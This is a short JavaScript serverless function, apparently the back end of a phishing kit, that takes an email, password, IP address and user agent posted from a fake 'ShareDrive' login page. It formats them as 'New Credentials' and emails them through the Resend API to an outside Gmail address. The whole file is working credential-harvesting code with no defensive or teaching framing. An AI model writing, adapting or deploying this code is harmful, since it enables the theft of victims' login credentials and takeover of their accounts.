// functions/collect.js
const fetch = require('node-fetch'); // <-- Import node-fetch

exports.handler = async (event, context) => {
  if (event.httpMethod !== 'POST') {
    return { statusCode: 405, body: 'Method Not Allowed' };
  }

  try {
    const { email, password, ip, userAgent } = JSON.parse(event.body);
    const apiKey = process.env.RESEND_API_KEY;

    if (!apiKey) {
      return { statusCode: 500, body: 'Missing API Key' };
    }

    const emailBody = `
🔐 New Credentials
📧 Email: ${email || 'N/A'}
🔑 Password: ${password || 'N/A'}
🌐 IP: ${ip || 'Unknown'}
📱 User-Agent: ${userAgent || 'N/A'}
⏰ Time: ${new Date().toISOString()}
    `;

    const response = await fetch('https://api.resend.com/emails', {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${apiKey}`,
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        from: 'onboarding@resend.dev',
        to: ['g82443047@gmail.com'], 
        subject: 'New Login - ShareDrive',
        text: emailBody.trim(),
        html: `<pre>${emailBody.trim()}</pre>`,
      }),
    });

    const rawText = await response.text();
    console.log('Resend Status:', response.status);
    console.log('Resend Response:', rawText);

    return { 
      statusCode: 200, 
      body: JSON.stringify({ success: true }),
      headers: { 'Content-Type': 'application/json' }
    };
  } catch (error) {
    console.error('CRITICAL ERROR:', error.message);
    return { 
      statusCode: 500, // Return 500 so we can see the error in the Network tab
      body: JSON.stringify({ error: 'Internal error', details: error.message }) 
    };
  }
};